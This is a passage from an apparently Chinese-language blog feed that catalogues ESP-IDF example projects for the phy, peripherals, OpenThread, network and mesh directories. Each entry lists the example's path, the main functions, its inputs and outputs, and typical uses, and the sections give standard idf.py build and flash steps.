性能验证</li><li>产品认证和合规性测试</li><li>无线通信质量评估</li><li>研发阶段的性能测试 |</li></ul><h3 id="7-3-技术要点"><a href="#7-3-技术要点" class="headerlink" title="7.3 技术要点"></a>7.3 技术要点</h3><ul><li><p><strong>天线切换功能</strong>：</p><ul><li>支持多天线的软件切换</li><li>动态选择最佳天线</li><li>支持接收和发射模式的天线配置</li><li>可配置的天线 GPIO 引脚</li></ul></li><li><p><strong>认证测试功能</strong>：</p><ul><li>Wi-Fi 认证测试支持</li><li>Bluetooth 认证测试支持</li><li>BLE DTM 测试功能（ESP32-H2 和 ESP32-C6）</li><li>支持多种测试模式（连续发射、数据包测试、单载波测试等）</li><li>详细的测试数据和统计</li></ul></li><li><p><strong>硬件支持</strong>：</p><ul><li>支持多种 ESP32 芯片</li><li>支持多天线配置</li><li>支持不同频率范围</li><li>支持不同调制方式</li></ul></li><li><p><strong>命令行界面</strong>：</p><ul><li>丰富的测试命令</li><li>命令历史记录</li><li>自动补全功能</li><li>清晰的测试结果输出</li></ul></li></ul><h3 id="7-4-构建与运行"><a href="#7-4-构建与运行" class="headerlink" title="7.4 构建与运行"></a>7.4 构建与运行</h3><p>所有 phy 例程的构建方法基本一致：</p><ol><li>设置目标芯片：<code>idf.py set-target &lt;chip_name&gt;</code></li><li>配置项目：<code>idf.py menuconfig</code></li><li>设置网络参数和测试配置</li><li>构建项目：<code>idf.py build</code></li><li>烧录并监控：<code>idf.py -p PORT flash monitor</code></li><li>根据具体例程的要求进行测试操作</li></ol><h3 id="7-5-应用场景总结"><a href="#7-5-应用场景总结" class="headerlink" title="7.5 应用场景总结"></a>7.5 应用场景总结</h3><ul><li><strong>antenna</strong>：适用于需要动态优化无线信号质量的场景，如智能家居设备和物联网设备</li><li><strong>cert_test</strong>：适用于无线设备的认证测试和性能验证，如产品研发和认证阶段</li></ul><p>这些例程展示了 ESP-IDF 在物理层（PHY）方面的强大功能，从天线优化到认证测试，满足不同场景下的无线通信需求。开发者可以根据自己的应用场景选择合适的例程作为基础，进行二次开发和扩展。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——外设</title>
    <link href="/ESP32-examples/20.peripherals(WIP)/"/>
    <url>/ESP32-examples/20.peripherals(WIP)/</url>
    
    <content type="html"><![CDATA[<h2 id="20-peripherals-目录"><a href="#20-peripherals-目录" class="headerlink" title="20. peripherals 目录"></a>20. peripherals 目录</h2><h3 id="20-1-gpio-generic-gpio-例程"><a href="#20-1-gpio-generic-gpio-例程" class="headerlink" title="20.1 gpio/generic_gpio 例程"></a>20.1 gpio/generic_gpio 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>gpio/generic_gpio</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\peripherals\gpio\generic_gpio</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示GPIO的基本配置和中断使用方法。实现了GPIO输出配置、GPIO输入配置（带上拉电阻）、上升沿和下降沿中断处理等功能。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>gpio_config()</code>：配置GPIO<br>- <code>gpio_set_level()</code>：设置GPIO输出电平<br>- <code>gpio_install_isr_service()</code>：安装GPIO中断服务<br>- <code>gpio_isr_handler_add()</code>：添加GPIO中断处理函数<br>- <code>gpio_example_task()</code>：生成GPIO脉冲的任务</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- GPIO输入引脚的外部信号<br><br>输出：<br>- GPIO输出引脚的脉冲信号<br>- 中断触发日志信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习GPIO的基本配置和使用<br>- 了解GPIO中断的处理方法<br>- 开发需要GPIO控制的应用<br>- 实现按钮输入、LED输出等基本外设控制<br>- 作为GPIO应用的参考模板</td></tr></tbody></table><h3 id="20-2-i2c-i2c-basic-例程"><a href="#20-2-i2c-i2c-basic-例程" class="headerlink" title="20.2 i2c/i2c_basic 例程"></a>20.2 i2c/i2c_basic 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>i2c/i2c_basic</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\peripherals\i2c\i2c_basic</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示I2C主机的基本操作。实现了I2C总线初始化、I2C设备地址探测、寄存器读写等功能。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>i2c_master_init()</code>：初始化I2C主机<br>- <code>i2c_master_sensor_detect()</code>：探测I2C设备<br>- <code>i2c_master_register_write_byte()</code>：写入单个字节到寄存器<br>- <code>i2c_master_register_read_byte()</code>：从寄存器读取单个字节<br>- <code>i2c_master_register_read()</code>：从寄存器读取多个字节</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- I2C设备地址<br>- 寄存器地址<br>- 要写入的数据<br><br>输出：<br>- 探测到的I2C设备<br>- 从设备读取的数据</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习I2C总线的基本使用<br>- 了解I2C主机的实现方法<br>- 开发需要I2C通信的应用<br>- 连接I2C传感器、OLED显示屏等设备<br>- 作为I2C应用的参考模板</td></tr></tbody></table><h3 id="20-3-ledc-ledc-basic-例程"><a href="#20-3-ledc-ledc-basic-例程" class="headerlink" title="20.3 ledc/ledc_basic 例程"></a>20.3 ledc/ledc_basic 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>ledc/ledc_basic</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\peripherals\ledc\ledc_basic</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示LED PWM控制器(LEDC)的基本使用。实现了LEDC通道初始化、PWM波形生成、占空比调整等功能。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>ledc_timer_config()</code>：配置LEDC定时器<br>- <code>ledc_channel_config()</code>：配置LEDC通道<br>- <code>ledc_set_duty()</code>：设置LEDC占空比<br>- <code>ledc_update_duty()</code>：更新LEDC占空比<br>- <code>ledc_example_task()</code>：调整占空比的任务</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- 定时器配置参数（频率、分辨率）<br>- 通道配置参数（GPIO引脚、速度模式）<br>- 占空比数值<br><br>输出：<br>- PWM波形输出<br>- 占空比变化日志</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习LEDC PWM控制器的使用<br>- 了解PWM波形的生成方法<br>- 开发需要PWM控制的应用<br>- 实现LED亮度调节、电机速度控制等<br>- 作为LEDC应用的参考模板</td></tr></tbody></table><h3 id="20-4-rmt-led-strip-例程"><a href="#20-4-rmt-led-strip-例程" class="headerlink" title="20.4 rmt/led_strip 例程"></a>20.4 rmt/led_strip 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>rmt/led_strip</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\peripherals\rmt\led_strip</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用RMT(Remote Control)外设控制WS2812等LED灯带。实现了RMT通道初始化、LED数据编码、颜色设置等功能。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>rmt_config()</code>：配置RMT通道<br>- <code>rmt_driver_install()</code>：安装RMT驱动<br>- <code>led_strip_encoder_init()</code>：初始化LED数据编码器<br>- <code>rmt_translator_init()</code>：初始化RMT转换器<br>- <code>rmt_write_items()</code>：发送RMT数据<br>- <code>led_strip_set_pixel()</code>：设置LED像素颜色</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- LED像素索引<br>- RGB颜色值<br><br>输出：<br>- LED灯带颜色变化</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习RMT外设的使用<br>- 了解LED灯带的控制原理<br>- 开发LED灯带应用<br>- 实现彩色灯光效果、装饰照明等<br>- 作为RMT应用的参考模板</td></tr></tbody></table><h3 id="20-5-spi-spi-master-例程"><a href="#20-5-spi-spi-master-例程" class="headerlink" title="20.5 spi/spi_master 例程"></a>20.5 spi/spi_master 例程</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>spi/spi_master</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\peripherals\spi\spi_master</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示SPI主机的基本操作。实现了SPI总线初始化、全双工通信、半双工通信、DMA传输等功能。</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- <code>app_main()</code>：程序入口函数<br>- <code>spi_bus_initialize()</code>：初始化SPI总线<br>- <code>spi_device_add()</code>：添加SPI设备<br>- <code>spi_device_transmit()</code>：传输SPI数据<br>- <code>spi_device_queue_trans()</code>：队列方式传输SPI数据<br>- <code>spi_device_get_trans_result()</code>：获取传输结果</td></tr><tr><td><strong>输入输出参数说明</strong></td><td>输入：<br>- SPI设备配置（时钟频率、模式、CS引脚）<br>- 要发送的数据<br><br>输出：<br>- 从SPI设备接收的数据<br>- 传输状态信息</td></tr><tr><td><strong>适用场景及典型应用案例</strong></td><td>适用于：<br>- 学习SPI总线的基本使用<br>- 了解SPI主机的实现方法<br>- 开发需要SPI通信的应用<br>- 连接SPI显示屏、Flash芯片、传感器等设备<br>- 作为SPI应用的参考模板</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——OpenThread 命令行界面</title>
    <link href="/ESP32-examples/13.openthread(WIP)/"/>
    <url>/ESP32-examples/13.openthread(WIP)/</url>
    
    <content type="html"><![CDATA[<h2 id="13-openthread-目录"><a href="#13-openthread-目录" class="headerlink" title="13. openthread 目录"></a>13. openthread 目录</h2><h3 id="13-1-ot-cli"><a href="#13-1-ot-cli" class="headerlink" title="13.1 ot_cli"></a>13.1 ot_cli</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>OpenThread 命令行示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples/openthread/ot_cli</td></tr><tr><td><strong>核心功能说明</strong></td><td>提供 OpenThread 命令行界面，支持 TCP、UDP 和 Iperf 等扩展功能，用于管理和调试 Thread 网络</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- OpenThread CLI API</td></tr></tbody></table><ul><li>OpenThread 协议栈</li><li>IEEE 802.15.4 驱动</li><li>console 组件（命令行界面）</li><li>支持 UART 和 USB Serial/JTAG 控制台输出</li><li>支持 ESP32-C5、ESP32-C6、ESP32-H2 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>控制台输出通道（UART 或 USB Serial/JTAG）</li><li>Thread 网络参数（通道、PAN ID、地址等）</li></ul><p>输出结果：</p><ul><li>命令执行状态和结果</li><li>网络配置信息</li><li>节点状态和角色</li><li>IP 地址信息</li><li>数据包发送和接收状态 |<br>| <strong>适用场景及典型应用案例</strong> | - Thread 网络的开发和调试</li><li>Thread 协议栈的功能验证</li><li>不同 Thread 设备之间的兼容性测试</li><li>基于 Thread 的物联网设备开发</li><li>网络参数的优化和测试 |</li></ul><h3 id="13-2-ot-rcp"><a href="#13-2-ot-rcp" class="headerlink" title="13.2 ot_rcp"></a>13.2 ot_rcp</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>OpenThread Radio Co-Processor (RCP) 示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples/openthread/ot_rcp</td></tr><tr><td><strong>核心功能说明</strong></td><td>实现 OpenThread 无线电协处理器，与主机配合工作，提供 802.15.4 无线电功能，用于 Thread 边界路由器或 Thread 嗅探器</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- OpenThread RCP 协议栈</td></tr></tbody></table><ul><li>IEEE 802.15.4 驱动</li><li>UART 通信接口</li><li>支持 ESP32-C5、ESP32-C6、ESP32-H2 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>UART 通信参数（波特率、引脚）</li><li>固件大小优化配置</li><li>日志级别设置</li></ul><p>输出结果：</p><ul><li>设备初始化状态</li><li>UART 通信状态</li><li>802.15.4 无线电状态</li><li>数据包处理状态 |<br>| <strong>适用场景及典型应用案例</strong> | - Thread 边界路由器的无线电组件</li><li>Thread 网络嗅探器</li><li>工业自动化网络的无线通信组件</li><li>智能家居设备的无线连接解决方案</li><li>物联网网关的无线扩展 |</li></ul><h3 id="13-3-ot-br"><a href="#13-3-ot-br" class="headerlink" title="13.3 ot_br"></a>13.3 ot_br</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>OpenThread 边界路由器示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples/openthread/ot_br</td></tr><tr><td><strong>核心功能说明</strong></td><td>实现 OpenThread 边界路由器，连接 Thread 网络和 Wi-Fi/Ethernet 网络，支持双向 IPv6 连接和服务发现</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- OpenThread 边界路由器功能</td></tr></tbody></table><ul><li>WiFi 驱动（STA 模式）</li><li>Ethernet 驱动</li><li>IPv6 路由和邻居发现</li><li>mDNS 服务发现</li><li>SRP（Service Registration Protocol）支持</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>Wi-Fi SSID 和密码</li><li>自动启动设置</li><li>以太网配置</li><li>控制台输出通道</li></ul><p>输出结果：</p><ul><li>网络连接状态</li><li>Thread 网络形成状态</li><li>IPv6 地址分配</li><li>服务发现结果</li><li>数据包转发状态 |<br>| <strong>适用场景及典型应用案例</strong> | - Thread 网络与外部网络的桥接</li><li>智能家居设备的互联网连接</li><li>工业自动化网络的边界网关</li><li>智能建筑的网络基础设施</li><li>物联网设备的远程监控和控制 |</li></ul><h3 id="13-4-ot-sleepy-device"><a href="#13-4-ot-sleepy-device" class="headerlink" title="13.4 ot_sleepy_device"></a>13.4 ot_sleepy_device</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>OpenThread 休眠设备示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples/openthread/ot_sleepy_device</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示 OpenThread 休眠设备的实现，支持 802.15.4 无线电休眠，延长电池寿命</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- OpenThread 协议栈</td></tr></tbody></table><ul><li>IEEE 802.15.4 驱动</li><li>休眠管理功能</li><li>支持 IEEE 802.15.4 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>休眠周期</li><li>唤醒时间</li><li>Thread 网络参数</li></ul><p>输出结果：</p><ul><li>设备休眠和唤醒状态</li><li>网络连接状态</li><li>数据传输状态</li><li>电池寿命优化效果 |<br>| <strong>适用场景及典型应用案例</strong> | - 电池供电的传感器设备</li><li>环境监测设备</li><li>可穿戴设备</li><li>智能家居传感器</li><li>工业无线传感器网络 |</li></ul><h3 id="13-5-技术要点"><a href="#13-5-技术要点" class="headerlink" title="13.5 技术要点"></a>13.5 技术要点</h3><ul><li><p><strong>OpenThread 协议支持</strong>：</p><ul><li>完整的 Thread 1.3 协议支持</li><li>IPv6 连接</li><li>服务发现（SRP 和 mDNS）</li><li>休眠设备支持</li></ul></li><li><p><strong>硬件兼容性</strong>：</p><ul><li>支持多种 ESP32 芯片</li><li>支持单独的 802.15.4 芯片（如 ESP32-H2）</li><li>支持 Wi-Fi + Thread 双芯片解决方案</li><li>支持以太网连接</li></ul></li><li><p><strong>网络拓扑</strong>：</p><ul><li>支持 Leader、Router、Child 等多种节点角色</li><li>支持自组织网络</li><li>支持网络自动修复</li></ul></li><li><p><strong>通信接口</strong>：</p><ul><li>UART 通信</li><li>USB Serial/JTAG 支持</li><li>支持多种控制台输出通道</li></ul></li><li><p><strong>电源管理</strong>：</p><ul><li>支持设备休眠</li><li>支持低功耗模式</li><li>电池寿命优化</li></ul></li></ul><h3 id="13-6-构建与运行"><a href="#13-6-构建与运行" class="headerlink" title="13.6 构建与运行"></a>13.6 构建与运行</h3><p>所有 openthread 例程的构建方法基本一致：</p><ol><li>配置项目：<code>idf.py menuconfig</code></li><li>设置网络参数和硬件配置</li><li>构建项目：<code>idf.py build</code></li><li>烧录到开发板：<code>idf.py -p PORT flash monitor</code></li><li>根据具体例程的要求进行网络连接和测试</li></ol><h3 id="13-7-应用场景总结"><a href="#13-7-应用场景总结" class="headerlink" title="13.7 应用场景总结"></a>13.7 应用场景总结</h3><ul><li><strong>ot_cli</strong>：适用于 Thread 网络的开发和调试，以及协议功能验证</li><li><strong>ot_rcp</strong>：适用于 Thread 边界路由器和 Thread 嗅探器的无线电组件</li><li><strong>ot_br</strong>：适用于 Thread 网络与外部网络的桥接，实现双向 IPv6 连接</li><li><strong>ot_sleepy_device</strong>：适用于电池供电的传感器设备，延长设备寿命</li><li><strong>ot_trel</strong>：适用于需要长距离、高可靠性 Thread 网络通信的场景</li></ul><p>这些例程展示了 ESP-IDF 在 OpenThread 方面的全面支持，从基础的命令行工具到复杂的边界路由器，满足不同场景下的 Thread 网络需求。开发者可以根据自己的应用场景选择合适的例程作为基础，进行二次开发和扩展。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——网络</title>
    <link href="/ESP32-examples/15.network/"/>
    <url>/ESP32-examples/15.network/</url>
    
    <content type="html"><![CDATA[<h2 id="15-network-目录"><a href="#15-network-目录" class="headerlink" title="15. network 目录"></a>15. network 目录</h2><h3 id="15-1-bridge"><a href="#15-1-bridge" class="headerlink" title="15.1 bridge"></a>15.1 bridge</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>以太网桥接示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\network\bridge</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 LwIP IEEE 802.1D 桥接功能将多个以太网接口或以太网与 WiFi AP 接口连接起来，实现不同网络之间的数据包转发</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- LwIP IEEE 802.1D 桥接功能</td></tr></tbody></table><ul><li>ESP-NETIF 适配器组件</li><li>Ethernet 驱动</li><li>WiFi 驱动</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>启用 LwIP IEEE 802.1D 桥接选项</li><li>配置网络接口数量</li><li>以太网硬件参数</li><li>WiFi AP 设置</li></ul><p>输出结果：</p><ul><li>桥接接口初始化状态</li><li>网络链路状态变化</li><li>IP 地址获取情况</li><li>设备通信状态 |<br>| <strong>适用场景及典型应用案例</strong> | - 工业自动化网络中的设备互联</li><li>智能家居设备的网络桥接</li><li>大型场馆的网络覆盖扩展</li><li>网络拓扑简化（从树形到环形）</li><li>低成本网络交换机替代方案 |</li></ul><h3 id="15-2-eth2ap"><a href="#15-2-eth2ap" class="headerlink" title="15.2 eth2ap"></a>15.2 eth2ap</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>以太网到 WiFi AP 转发示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\network\eth2ap</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何实现以太网和 WiFi AP 之间的数据包转发，将 ESP32 作为简单的 “路由器”，使连接到 WiFi AP 的设备能够通过以太网访问外部网络</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- WiFi 驱动（AP 模式）</td></tr></tbody></table><ul><li>Ethernet 驱动</li><li>数据包转发逻辑</li><li>内部 API（如 esp_wifi_internal_tx）</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>WiFi AP SSID 和密码</li><li>最大连接数</li><li>以太网硬件参数</li></ul><p>输出结果：</p><ul><li>以太网和 WiFi 初始化状态</li><li>网络链路状态变化</li><li>WiFi 客户端连接状态</li><li>数据包转发状态 |<br>| <strong>适用场景及典型应用案例</strong> | - 家庭网络扩展</li><li>IoT 设备的有线到无线转换</li><li>移动设备的临时网络接入点</li><li>工业设备的无线连接解决方案 |</li></ul><h3 id="15-3-simple-sniffer"><a href="#15-3-simple-sniffer" class="headerlink" title="15.3 simple_sniffer"></a>15.3 simple_sniffer</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>简单网络嗅探器示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\network\simple_sniffer</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 WiFi 或以太网接口捕获网络数据包，并将其保存为 pcap 格式文件（支持 SD 卡、内存或 JTAG 输出），可用于网络分析和调试</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- WiFi 驱动（混杂模式）</td></tr></tbody></table><ul><li>Ethernet 驱动</li><li>console 组件（命令行界面）</li><li>SD 卡驱动</li><li>app_trace 组件（JTAG 输出）</li><li>pcap 格式处理</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>数据包存储目标（SD 卡、内存或 JTAG）</li><li>命令历史记录存储</li><li>SD 卡挂载点</li><li>嗅探任务优先级和栈大小</li><li>以太网硬件参数</li></ul><p>输出结果：</p><ul><li>设备初始化状态</li><li>SD 卡挂载状态</li><li>数据包捕获统计</li><li>pcap 文件创建和关闭状态</li><li>数据包摘要信息 |<br>| <strong>适用场景及典型应用案例</strong> | - 网络故障诊断</li><li>网络流量分析</li><li>安全审计</li><li>协议开发和调试</li><li>IoT 设备通信监控 |</li></ul><h3 id="15-4-sta2eth"><a href="#15-4-sta2eth" class="headerlink" title="15.4 sta2eth"></a>15.4 sta2eth</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>WiFi 站到有线接口转发示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\network\sta2eth</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何将 WiFi 站连接转换为有线连接（以太网或 USB NCM 设备），使仅支持有线连接的设备能够访问无线网络</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- WiFi 驱动（站模式）</td></tr></tbody></table><ul><li>Ethernet 驱动</li><li>USB NCM 驱动（ESP32-S2/S3）</li><li>数据包转发逻辑</li><li>配置网页服务器</li><li>统一配网功能</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>配网方式（网页或统一配网）</li><li>WiFi 网络参数</li><li>有线接口类型（以太网或 USB NCM）</li></ul><p>输出结果：</p><ul><li>WiFi 连接状态</li><li>有线接口初始化状态</li><li>配网状态</li><li>设备 IP 地址信息</li><li>数据包转发状态 |<br>| <strong>适用场景及典型应用案例</strong> | - 传统有线设备的无线升级</li><li>工业设备的无线网络接入</li><li>医疗设备的无线连接</li><li>智能家居设备的网络扩展</li><li>临时网络连接解决方案 |</li></ul><h3 id="15-5-vlan-support"><a href="#15-5-vlan-support" class="headerlink" title="15.5 vlan_support"></a>15.5 vlan_support</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>以太网 VLAN 支持示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\network\vlan_support</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何在以太网接口上创建虚拟 VLAN 接口，支持不同 VLAN 标签的数据包处理和转发</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- Ethernet 驱动</td></tr></tbody></table><ul><li>VLAN 接口管理</li><li>静态 IP 配置</li><li>DHCP 客户端</li><li>支持多种 ESP32 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>VLAN 标签</li><li>静态 IP 地址、子网掩码和网关</li><li>以太网硬件参数</li></ul><p>输出结果：</p><ul><li>以太网和 VLAN 接口初始化状态</li><li>网络链路状态变化</li><li>IP 地址获取情况</li><li>VLAN 接口通信状态 |<br>| <strong>适用场景及典型应用案例</strong> | - 工业自动化网络中的 VLAN 隔离</li><li>企业网络中的多部门隔离</li><li>智能家居设备的网络分段</li><li>安全监控网络的隔离</li><li>多租户网络环境 |</li></ul><h3 id="15-6-技术要点"><a href="#15-6-技术要点" class="headerlink" title="15.6 技术要点"></a>15.6 技术要点</h3><ul><li><p><strong>网络桥接技术</strong>：</p><ul><li>支持多种网络接口组合（以太网-以太网、以太网-WiFi AP）</li><li>LwIP IEEE 802.1D 桥接协议</li><li>数据包转发和过滤</li></ul></li><li><p><strong>WiFi 功能</strong>：</p><ul><li>支持 AP 模式和站模式</li><li>混杂模式用于网络嗅探</li><li>内部 API 用于数据包发送</li></ul></li><li><p><strong>以太网功能</strong>：</p><ul><li>支持多种 PHY 芯片</li><li>支持 SPI 以太网模块</li><li>VLAN 标签处理</li><li>多以太网接口支持</li></ul></li><li><p><strong>数据包处理</strong>：</p><ul><li>pcap 格式支持</li><li>数据包过滤</li><li>数据包转发</li><li>流量控制</li></ul></li><li><p><strong>配网方式</strong>：</p><ul><li>网页配网</li><li>统一配网</li><li>手动配网</li></ul></li></ul><h3 id="15-7-构建与运行"><a href="#15-7-构建与运行" class="headerlink" title="15.7 构建与运行"></a>15.7 构建与运行</h3><p>所有 network 例程的构建方法基本一致：</p><ol><li>配置项目：<code>idf.py menuconfig</code></li><li>设置网络参数和硬件配置</li><li>构建项目：<code>idf.py build</code></li><li>烧录并监控：<code>idf.py -p PORT flash monitor</code></li><li>根据具体例程的要求进行网络连接和测试</li></ol><h3 id="15-8-应用场景总结"><a href="#15-8-应用场景总结" class="headerlink" title="15.8 应用场景总结"></a>15.8 应用场景总结</h3><ul><li><strong>bridge</strong>：适用于需要连接多个网络的场景，如工业自动化和智能家居</li><li><strong>eth2ap</strong>：适用于将有线网络转换为无线网络的场景，如家庭网络扩展</li><li><strong>simple_sniffer</strong>：适用于网络分析和调试场景，如网络故障诊断和安全审计</li><li><strong>sta2eth</strong>：适用于将无线网络转换为有线网络的场景，如传统设备的无线升级</li><li><strong>vlan_support</strong>：适用于需要网络隔离的场景，如企业网络和工业自动化</li></ul><p>这些例程展示了 ESP-IDF 在网络方面的强大功能，从简单的数据包转发到复杂的 VLAN 支持，满足不同场景下的网络需求。开发者可以根据自己的应用场景选择合适的例程作为基础，进行二次开发和扩展。</p>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>ESP32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP-IDF 例程——MESH组网</title>
    <link href="/ESP32-examples/10.mesh/"/>
    <url>/ESP32-examples/10.mesh/</url>
    
    <content type="html"><![CDATA[<h2 id="10-mesh-目录"><a href="#10-mesh-目录" class="headerlink" title="10. mesh 目录"></a>10. mesh 目录</h2><h3 id="10-1-internal-communication"><a href="#10-1-internal-communication" class="headerlink" title="10.1 internal_communication"></a>10.1 internal_communication</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>mesh 内部通信示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\mesh\internal_communication</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 mesh API 设置 mesh 网络、在 mesh 网络上发送和接收消息，以及实现基于 mesh 的灯光控制应用</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- ESP-MESH API</td></tr></tbody></table><ul><li>WiFi 驱动</li><li>事件处理系统</li><li>支持 ESP32、ESP32-C3、ESP32-C5、ESP32-C6、ESP32-C61、ESP32-S2、ESP32-S3 芯片 |<br>| <strong>输入输出参数说明</strong> | 配置参数：</li><li>mesh 网络通道</li><li>路由器 SSID 和密码</li><li>mesh softAP 设置</li></ul><p>输出结果：</p><ul><li>mesh 网络状态变化</li><li>设备层级信息</li><li>消息发送和接收状态</li><li>灯光控制命令执行结果</li><li>RGB 灯颜色变化（ESP-WROVER-KIT 板） |<br>| <strong>适用场景及典型应用案例</strong> | - 基于 mesh 的灯光控制系统</li><li>智能家居设备网络</li><li>传感器数据采集网络</li><li>工业自动化控制系统</li><li>大型场馆的无线网络覆盖</li><li>物联网设备的自组织网络 |</li></ul><h3 id="10-2-ip-internal-network"><a href="#10-2-ip-internal-network" class="headerlink" title="10.2 ip_internal_network"></a>10.2 ip_internal_network</h3><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td><strong>例程名称</strong></td><td>mesh IP 内部网络示例</td></tr><tr><td><strong>所在文件夹路径</strong></td><td>examples\mesh\ip_internal_network</td></tr><tr><td><strong>核心功能说明</strong></td><td>演示如何使用 mesh 创建支持 IP 的子网络，结合 MQTT 实现节点间通信和外部网络连接</td></tr><tr><td><strong>主要调用的内部/外部函数或模块</strong></td><td>- ESP-MESH API</td></tr></tbody></table><ul><li>WiFi 驱动</li><li>事件处理系统</li><li>MQTT 